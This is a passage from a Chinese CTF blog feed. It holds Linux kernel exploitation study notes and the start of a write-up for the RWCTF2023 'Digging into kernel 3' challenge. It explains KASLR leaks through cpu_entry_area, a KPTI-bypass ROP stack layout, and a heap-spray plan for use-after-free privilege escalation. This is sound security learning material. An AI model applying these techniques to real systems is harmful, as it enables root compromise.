proc near </span><br></pre></td></tr></table></figure><h2 id="cpu-entry-area-mapping"><a href="#cpu-entry-area-mapping" class="headerlink" title="cpu_entry_area mapping"></a>cpu_entry_area mapping</h2><p>在内核官方文档给出的虚拟内存布局中,有这么一个区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping</span><br></pre></td></tr></table></figure><p>这里找到了一些相关的资料</p><blockquote><p><code>cpu_entry_area</code> contains all the data and code needed to allow the CPU to hand control over to the kernel. You can see its definition in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/asm/cpu_entry_area.h"><code>arch/x86/include/asm/cpu_entry_area.h</code></a>: it contains</p><ul><li>the GDT;</li><li>the entry stack;</li><li>the TSS;</li><li>a set of trampolines;</li><li>the exception stacks;</li><li>debug stores and buffers.</li></ul><p>The trampolines contain the entry points for syscalls; see for example <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/entry/entry_64.S"><code>arch/x86/entry/entry_64.S</code></a> which defines the entry point for 64-bit calls.</p></blockquote><p>里面存储了一些cpu与内核之间需要共享的信息</p><p>对于kernel pwn来说我们只需要知道,这个区域存储着一些<code>.text</code>段的指针</p><p>并且最棒的是这个区域不参与地址随机化,所以这个区域完全可以用来泄露基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xfffffe0000000004</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xfffffe0000000004</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xfffffe000000000c</span> ◂— <span class="number">0x10114000000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xfffffe0000000014</span> —▸ <span class="number">0xffffffff90e08e03</span> ◂— nop </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xfffffe000000001c</span> ◂— <span class="number">0x10162000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xfffffe0000000024</span> —▸ <span class="number">0xffffffff90e08e02</span> ◂— nop </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xfffffe000000002c</span> ◂— <span class="number">0x1011a000000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xfffffe0000000034</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xfffffe000000003c</span> ◂— <span class="number">0x100d0000000000</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xfffffe0000000044</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xfffffe000000004c</span> ◂— <span class="number">0x100d3000000000</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xfffffe0000000054</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xfffffe000000005c</span> ◂— <span class="number">0x100d6000000000</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xfffffe0000000064</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xfffffe000000006c</span> ◂— <span class="number">0x100d9000000000</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xfffffe0000000074</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xfffffe000000007c</span> ◂— <span class="number">0x100dc000000000</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xfffffe0000000084</span> —▸ <span class="number">0xffffffff90e08e01</span> ◂— nop </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xfffffe000000008c</span> ◂— <span class="number">0x100df000000000</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xfffffe0000000094</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xfffffe000000009c</span> ◂— <span class="number">0x100e2000000000</span></span><br></pre></td></tr></table></figure><h2 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h2><p>在Linux下，对于每一个进程，内核都会申请一块struct task_struct结构体来保存进程信息 由全局结构体init_task为链表头，<u>由struct list_head children双向循环链表链接其他进程的task_struct</u></p><p>特别要注意到，struct list_head children中的next指针指向的是下一个task_struct中<strong>children成员 + 0x10</strong>，而非task_struct头部或list_head的next指针</p><h2 id="内存搜索进程"><a href="#内存搜索进程" class="headerlink" title="内存搜索进程"></a>内存搜索进程</h2><p>当我们获得了搜索内存的能力之后,为了进一步的提权,就需要找到cred或者task_struct结构体</p><p>但是在茫茫二进制中如何找到这些数据是一个难题</p><p>但好在我们可以利用一些标志性的数据来判断是否命中</p><p>例如<code>prctl(PR_SET_NAME,&quot;new_process_name&quot;)</code>可以修改本进程<code>comm</code>字段的内容,而comm附近有存在cred指针</p><p>又或者利用<code>init_task</code>不停遍历所有的task_struct结构体,然后通过pid,canary,comm等确认结构体</p><p>对于init_task对应的pid 0进程而言，pid和t_pid均为0，stack_canary为低八位为0其他位不为0的8字节数，comm通常为”swapper/0″</p><h2 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass_kpti"></a>bypass_kpti</h2><p>KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（不过用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间。不过由于涉及到上下文切换，所以在用户态页表中必须包含部分内核地址，用来建立到中断入口和出口的映射。</p><p>当中断在用户态发生时，就涉及到切换CR3寄存器，从用户态地址空间切换到内核态的地址空间。中断上半部的要求是尽可能的快，从而切换CR3这个操作也要求尽可能的快。为了达到这个目的，KPTI中将内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中(<strong>内核态在低位，用户态在高位</strong>).<strong>这段空间必须是8K对齐的</strong>，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。</p><p>kernel pwn中需要用到的一般就是在提权后顺利返回到用户态</p><p>所以有一种方法就是利用swapgs_restore_regs_and_return_to_usermode这个函数返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms| grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">arch/x86/entry/entry_64.S</span><br><span class="line"></span><br><span class="line"><span class="title function_">SYM_INNER_LABEL</span><span class="params">(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span></span><br><span class="line"></span><br><span class="line">    POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">     * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    movq    %rsp, %rdi</span><br><span class="line">    movq    <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_tss_rw + TSS_sp0)</span>, %rsp</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">    pushq    6*8<span class="params">(%rdi)</span>    <span class="comment">/* SS */</span></span><br><span class="line">    pushq    5*8<span class="params">(%rdi)</span>    <span class="comment">/* RSP */</span></span><br><span class="line">    pushq    4*8<span class="params">(%rdi)</span>    <span class="comment">/* EFLAGS */</span></span><br><span class="line">    pushq    3*8<span class="params">(%rdi)</span>    <span class="comment">/* CS */</span></span><br><span class="line">    pushq    2*8<span class="params">(%rdi)</span>    <span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">    <span class="title function_">pushq</span>    <span class="params">(%rdi)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">     * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Restore RDI. */</span></span><br><span class="line">    popq    %rdi</span><br><span class="line">    SWAPGS</span><br><span class="line">    INTERRUPT_RETURN</span><br></pre></td></tr></table></figure><p>纯汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600A34 41 5F                          pop     r15</span><br><span class="line">.text:FFFFFFFF81600A36 41 5E                          pop     r14</span><br><span class="line">.text:FFFFFFFF81600A38 41 5D                          pop     r13</span><br><span class="line">.text:FFFFFFFF81600A3A 41 5C                          pop     r12</span><br><span class="line">.text:FFFFFFFF81600A3C 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF81600A3D 5B                             pop     rbx</span><br><span class="line">.text:FFFFFFFF81600A3E 41 5B                          pop     r11</span><br><span class="line">.text:FFFFFFFF81600A40 41 5A                          pop     r10</span><br><span class="line">.text:FFFFFFFF81600A42 41 59                          pop     r9</span><br><span class="line">.text:FFFFFFFF81600A44 41 58                          pop     r8</span><br><span class="line">.text:FFFFFFFF81600A46 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600A47 59                             pop     rcx</span><br><span class="line">.text:FFFFFFFF81600A48 5A                             pop     rdx</span><br><span class="line">.text:FFFFFFFF81600A49 5E                             pop     rsi</span><br><span class="line">.text:FFFFFFFF81600A4A 48 89 E7                       mov     rdi, rsp    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br><span class="line">.text:FFFFFFFF81600A4D 65 48 8B 24 25+                mov     rsp, gs: 0x5004</span><br><span class="line">.text:FFFFFFFF81600A56 FF 77 30                       push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81600A59 FF 77 28                       push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81600A5C FF 77 20                       push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81600A5F FF 77 18                       push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81600A62 FF 77 10                       push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81600A65 FF 37                          push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81600A67 50                             push    rax</span><br><span class="line">.text:FFFFFFFF81600A68 EB 43                          nop</span><br><span class="line">.text:FFFFFFFF81600A6A 0F 20 DF                       mov     rdi, cr3</span><br><span class="line">.text:FFFFFFFF81600A6D EB 34                          jmp     0xFFFFFFFF81600AA3</span><br><span class="line"></span><br><span class="line">.text:FFFFFFFF81600AA3 48 81 CF 00 10+                or      rdi, 1000h</span><br><span class="line">.text:FFFFFFFF81600AAA 0F 22 DF                       mov     cr3, rdi</span><br><span class="line">.text:FFFFFFFF81600AAD 58                             pop     rax</span><br><span class="line">.text:FFFFFFFF81600AAE 5F                             pop     rdi</span><br><span class="line">.text:FFFFFFFF81600AAF FF 15 23 65 62+                call    cs: SWAPGS</span><br><span class="line">.text:FFFFFFFF81600AB5 FF 25 15 65 62+                jmp     cs: INTERRUPT_RETURN</span><br><span class="line"></span><br><span class="line">_SWAPGS</span><br><span class="line">.text:FFFFFFFF8103EFC0 55                             push    rbp</span><br><span class="line">.text:FFFFFFFF8103EFC1 48 89 E5                       mov     rbp, rsp</span><br><span class="line">.text:FFFFFFFF8103EFC4 0F 01 F8                       swapgs</span><br><span class="line">.text:FFFFFFFF8103EFC7 5D                             pop     rbp</span><br><span class="line">.text:FFFFFFFF8103EFC8 C3                             retn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_INTERRUPT_RETURN</span><br><span class="line">.text:FFFFFFFF81600AE0 F6 44 24 20 04                 test    byte ptr [rsp+0x20], 4</span><br><span class="line">.text:FFFFFFFF81600AE5 75 02                          jnz     native_irq_return_ldt</span><br><span class="line">.text:FFFFFFFF81600AE7 48 CF                          iretq</span><br></pre></td></tr></table></figure><p>ROP时,程序流程控制到 mov rdi, rsp 指令时，栈布局如下就行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsp  ----&gt;  0</span><br><span class="line">            0</span><br><span class="line">            rip</span><br><span class="line">            cs</span><br><span class="line">            rflags</span><br><span class="line">            rsp</span><br><span class="line">            ss</span><br></pre></td></tr></table></figure><p>然后貌似不能够直接从mov rdi,cr3处开始(还没确认)</p><p>此外改modprobe_path也是一个不错的方法，返回后当前进程Segmentation fault也不影响提权</p>]]></content>
    
    
    <summary type="html">kernel好难,先做个十几二十题熟悉熟悉 (摆了,只做了不到十题_orz)</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记2</title>
    <link href="https://ixout.github.io/posts/63384/"/>
    <id>https://ixout.github.io/posts/63384/</id>
    <published>2024-01-08T09:35:11.000Z</published>
    <updated>2024-11-20T14:11:46.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RWCTF2023-体验赛-Digging-into-kernel-3"><a href="#RWCTF2023-体验赛-Digging-into-kernel-3" class="headerlink" title="RWCTF2023 体验赛 - Digging into kernel 3"></a>RWCTF2023 体验赛 - Digging into kernel 3</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先看启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 \</span><br><span class="line">   4   │     -m 128M \</span><br><span class="line">   5   │     -nographic \</span><br><span class="line">   6   │     -kernel ./bzImage \</span><br><span class="line">   7   │     -initrd ./rootfs.img \</span><br><span class="line">   8   │     -cpu kvm64,+smap,+smep \</span><br><span class="line">   9   │     -monitor /dev/null \</span><br><span class="line">  10   │     -append <span class="string">&#x27;console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init&#x27;</span> \</span><br><span class="line">  11   │     -no-reboot \</span><br><span class="line">  12   │     -snapshot \</span><br><span class="line">  13   │     -s</span><br><span class="line">  14   │     </span><br><span class="line">  15   │     <span class="comment">#-enable-kvm \</span></span><br><span class="line">───────┴────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到开启了smap,smep,kaslr,kpri等保护</p><p>再看init脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ <span class="built_in">mkdir</span> /tmp </span><br><span class="line">   4   │ mount -t proc none /proc </span><br><span class="line">   5   │ mount -t sysfs none /sys </span><br><span class="line">   6   │ mount -t devtmpfs none /dev </span><br><span class="line">   7   │ mount -t tmpfs none /tmp </span><br><span class="line">   8   │ </span><br><span class="line">   9   │ <span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line">  10   │ <span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line">  11   │ <span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ insmod /rwctf.ko</span><br><span class="line">  14   │ <span class="built_in">chmod</span> 666 /dev/rwctf</span><br><span class="line">  15   │ <span class="built_in">chmod</span> 700 /flag</span><br><span class="line">  16   │ <span class="built_in">chmod</span> 400 /proc/kallsyms</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  19   │ <span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ poweroff -d 120 -f &amp;</span><br><span class="line">  22   │ </span><br><span class="line">  23   │ <span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span> </span><br><span class="line">  24   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  25   │ </span><br><span class="line">  26   │ umount /proc</span><br><span class="line">  27   │ umount /sys</span><br><span class="line">  28   │ umount /tmp</span><br><span class="line">  29   │ </span><br><span class="line">  30   │ poweroff -d 0 -f</span><br></pre></td></tr></table></figure><p>kptr_restrict参数控制是否对非特权用户隐藏内核符号地址的显示。</p><p>dmesg_restrict参数控制非特权用户对内核日志dmesg的访问权限。</p><p>为1就是非特权用户无权访问</p><p>那么主要就是利用rwctf.ko这个模块了</p><p>ida打开分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">rwmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  cdev = <span class="number">255</span>;</span><br><span class="line">  qword_7A8 = (__int64)<span class="string">&quot;rwctf&quot;</span>;</span><br><span class="line">  qword_7B0 = (__int64)&amp;file_ops;</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;cdev) )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line">    printk(&amp;unk_1B9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>misc_register()</code> 函数用于注册杂项字符设备</p><p>注册的函数真正有用的函数便只有ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) &amp;&amp; v7 &lt;= <span class="number">1</span> )</span><br><span class="line">      kfree(buf[v7]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v7, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    v5 = v7;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[v5] = _kmalloc(v8, <span class="number">3520LL</span>);</span><br><span class="line">    v6 = buf[v7];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; <span class="number">2147483647uLL</span> )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, v9, v8) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有明显的uaf漏洞,此外申请内存时最多只能同时控制两个obj</p><p>且必须申请后才能使用,这点倒是内核模块中似乎都如此</p><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>这个解法是ctf-wiki为了讲解heap-spray特意选用的一种方法,为了讲解这一技巧可能选用了不那么直接的方法</p><p>核心思路是通过uaf改大user_key_payload的datalen字段,以此做到溢出并泄露内核基址,并再次通过uaf写pipe管道的函数表字段从而完成最终利用</p><p>为了方便利用需要将decription长度和payload的长度区分开,以此简化利用模型,只需要考虑payload的两个obj</p><p><strong>add_key() 会先分配一个临时的 obj1 拷贝 payload 后再分配一个 obj2 作为 user_key_payload</strong>，若我们先分配一个 obj 并释放后再调用 add_key() 则该 obj 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 payload 的临时 obj 存在。</p><blockquote><p>另一个显然的办法是程序提供了两个obj的管理,那就使用这两个指针来uaf,但这里wiki为了展示堆喷这一技巧选择就用一个指针来完成</p><p>此外个人的一个想法是能不能使得obj1与obj2位于两个kmem_cache分配器中,其中关键的user_key_payload位于192,临时obj1则位于128,有时间可以试试</p></blockquote><p><strong>但我们可以通过堆喷将 UAF obj 分配到 user_key_payload</strong>，考虑如下流程：</p><ul><li>利用题目功能构建 UAF object。</li><li>堆喷射 <code>user_key_payload</code> ，UAF obj 作为拷贝 payload 的临时 obj 存在。</li><li><code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> ，完成后 UAF obj 被释放并回到 <code>kmem_cache_node</code>。</li><li>继续堆喷 <code>user_key_payload</code> ，<code>kmem_cache_cpu</code> 的 slub page 耗光，向 node 请求新的 slub page 分配 <code>user_key_payload</code> 。</li><li>UAF obj 所在页面被取回，UAF obj 被分配为 <code>user_key_payload</code> 。</li><li>利用题目功能再次释放 UAF obj，利用题目功能进行堆喷获取到该 obj，从而覆写 <code>user_key_payload</code> 。</li></ul><p>可能有点难理解,简单来说就是每次add_key会使用两个obj,第一个是临时obj最终会释放,而我们的目标是uaf第二个user_key_payload,</p><p>每次add_key实际上slab减少一个obj,因此在耗尽第一个slab之前显然每次我们uaf控制的都是临时obj,但在第一个slab仅剩一个obj时,这个obj被用来做第一个临时obj,而去一个新的slab获取第二个obj用作user_key_payload,那么在这次add_key结束后,第一个obj又被释放,那么在第二个slab仅剩一个obj时,再来一次add_key就会使我们能够uaf的obj作为user_key_payload</p><p>接下来我们考虑越界读取什么数据，这里我们并不需要分配其他的结构体， <code>rcu_head-&gt;func</code> <strong>函数指针在 rcu 对象被释放后才会被写入并调用，但调用完并不会将其置为 NULL</strong>，因此我们可以通过释放密钥的方式在内核堆上留下内核函数指针，从而完成内核基址的泄露。即通过key_read泄露slab页中残余的函数指针</p><p>可以用来控制内核执行流的结构体有很多，但是我们需要考虑如何完整地执行 <code>commit_creds(prepare_kernel_cred(NULL))</code> 后再成功返回用户态，因此我们需要进行栈迁移以布置较为完整的 ROP gadget chain。</p><p>由于题目开启了 SMEP、SMAP 保护，因此我们只能在内核空间伪造函数表，同时<u>内核中的大部分结构体的函数表为静态指定</u>（例如 <code>tty-&gt;ops</code> 总是 <code>ptm（或pty）_unix98_ops</code>），因此我们还需要知道一个内容可控的内核对象的地址，从而在内核空间中伪造函数表。</p><p>wiki选择管道相关的结构体完成利用；在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 